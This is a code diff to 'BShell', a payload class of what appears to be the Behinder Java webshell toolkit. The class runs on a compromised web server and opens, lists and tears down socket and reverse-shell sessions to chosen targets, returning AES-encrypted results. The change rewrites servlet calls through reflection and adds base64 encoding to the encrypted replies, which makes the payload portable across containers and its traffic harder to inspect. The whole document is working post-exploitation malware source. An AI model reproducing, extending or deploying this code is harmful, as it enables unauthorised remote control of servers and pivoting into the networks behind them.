@@ -1,6 +1,8 @@
 package net.rebeyond.behinder.payload.java;
 
+import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.lang.reflect.Method;
 import java.net.InetSocketAddress;
 import java.net.Socket;
 import java.nio.channels.ServerSocketChannel;
@@ -14,10 +16,6 @@ import java.util.Map;
 import java.util.Random;
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
-import javax.servlet.ServletOutputStream;
-import javax.servlet.ServletRequest;
-import javax.servlet.ServletResponse;
-import javax.servlet.http.HttpSession;
 import javax.servlet.jsp.PageContext;
 
 public class BShell implements Runnable {
@@ -25,26 +23,23 @@ public class BShell implements Runnable {
    public static String target;
    public static String type;
    public static String listenPort;
-   private ServletRequest Request;
-   private ServletResponse Response;
-   private HttpSession Session;
+   private Object Request;
+   private Object Response;
+   private Object Session;
 
    public BShell() {
    }
 
-   public BShell(HttpSession session) {
+   public BShell(Object session) {
       this.Session = session;
    }
 
    public boolean equals(Object obj) {
       PageContext page = (PageContext)obj;
-      this.Session = page.getSession();
-      this.Response = page.getResponse();
-      this.Request = page.getRequest();
       Map result = new HashMap();
-      this.Response.setCharacterEncoding("UTF-8");
 
       try {
+         this.fillContext(obj);
          if (action.equals("create")) {
             this.createBShell();
             ((Map)result).put("msg", target + "的BShell创建成功");
@@ -78,19 +73,20 @@ public class BShell implements Runnable {
             ((Map)result).put("msg", "no action");
             ((Map)result).put("status", "success");
          }
-      } catch (Exception var6) {
-         var6.printStackTrace();
-         ((Map)result).put("msg", var6.getMessage());
+      } catch (Exception var7) {
+         var7.printStackTrace();
+         ((Map)result).put("msg", var7.getMessage());
          ((Map)result).put("status", "fail");
       }
 
       try {
-         ServletOutputStream so = this.Response.getOutputStream();
-         so.write(this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
-         so.flush();
-         so.close();
-         page.getOut().clear();
-      } catch (Exception var5) {
+         Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
+         Method write = so.getClass().getMethod("write", byte[].class);
+         write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
+         so.getClass().getMethod("flush").invoke(so);
+         so.getClass().getMethod("close").invoke(so);
+      } catch (Exception var6) {
+         var6.printStackTrace();
       }
 
       return true;
@@ -99,7 +95,7 @@ public class BShell implements Runnable {
    private Map listBShell() throws Exception {
       Map result = new HashMap();
       Enumeration keys = this.sessionGetAttributeNames(this.Session);
-      ArrayList objArr = new ArrayList();
+      List objArr = new ArrayList();
 
       while(keys.hasMoreElements()) {
          String key = (String)keys.nextElement();
@@ -130,7 +126,7 @@ public class BShell implements Runnable {
    private Map listReverseBShell() throws Exception {
       Map result = new HashMap();
       Enumeration keys = this.sessionGetAttributeNames(this.Session);
-      ArrayList objArr = new ArrayList();
+      List objArr = new ArrayList();
 
       while(keys.hasMoreElements()) {
          String key = (String)keys.nextElement();
@@ -180,8 +176,8 @@ public class BShell implements Runnable {
       }
 
       Map result = new HashMap();
-      if (this.Session.getAttribute("BShellList") != null) {
-         Map BShellList = (Map)this.Session.getAttribute("BShellList");
+      if (this.sessionGetAttribute(this.Session, "BShellList") != null) {
+         Map BShellList = (Map)this.sessionGetAttribute(this.Session, "BShellList");
          if (BShellList.containsKey(target)) {
             Socket socket = (Socket)BShellList.get(target);
             if (socket != null && !socket.isClosed()) {
@@ -205,8 +201,8 @@ public class BShell implements Runnable {
 
    private Map clearBShell() throws Exception {
       Map result = new HashMap();
-      if (this.Session.getAttribute("BShellList") != null) {
-         this.Session.removeAttribute("BShellList");
+      if (this.sessionGetAttribute(this.Session, "BShellList") != null) {
+         this.sessionRemoveAttribute(this.Session, "BShellList");
       }
 
       result.put("status", "success");
@@ -272,13 +268,36 @@ public class BShell implements Runnable {
    }
 
    private byte[] Encrypt(byte[] bs) throws Exception {
-      String key = this.Session.getAttribute("u").toString();
+      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
       byte[] raw = key.getBytes("utf-8");
       SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
       Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
       cipher.init(1, skeySpec);
       byte[] encrypted = cipher.doFinal(bs);
-      return encrypted;
+      ByteArrayOutputStream bos = new ByteArrayOutputStream();
+      bos.write(encrypted);
+      return this.base64encode(bos.toByteArray()).getBytes();
+   }
+
+   private String base64encode(byte[] data) throws Exception {
+      String result = "";
+      String version = System.getProperty("java.version");
+
+      Class Base64;
+      try {
+         this.getClass();
+         Base64 = Class.forName("java.util.Base64");
+         Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
+         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
+      } catch (Throwable var7) {
+         this.getClass();
+         Base64 = Class.forName("sun.misc.BASE64Encoder");
+         Object Encoder = Base64.newInstance();
+         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
+         result = result.replace("\n", "").replace("\r", "");
+      }
+
+      return result;
    }
 
    private int listenBShell() throws IOException {
@@ -305,7 +324,7 @@ public class BShell implements Runnable {
       bShellSocketChannel.connect(new InetSocketAddress(target.split(":")[0], Integer.parseInt(target.split(":")[1])));
       bShellSocketChannel.configureBlocking(true);
       String key = "BShell_" + target;
-      this.Session.setAttribute(key, bShellSocketChannel);
+      this.sessionSetAttribute(this.Session, key, bShellSocketChannel);
    }
 
    public void run() {
@@ -361,6 +380,21 @@ public class BShell implements Runnable {
       }
 
       return paramsMap;
+   }
+
+   private void fillContext(Object obj) throws Exception {
+      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
+         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
+         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
+      } else {
+         Map objMap = (Map)obj;
+         this.Session = objMap.get("session");
+         this.Response = objMap.get("response");
+         this.Request = objMap.get("request");
+      }
+
+      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
    }
 
    private void sessionSetAttribute(Object session, String key, Object value) {
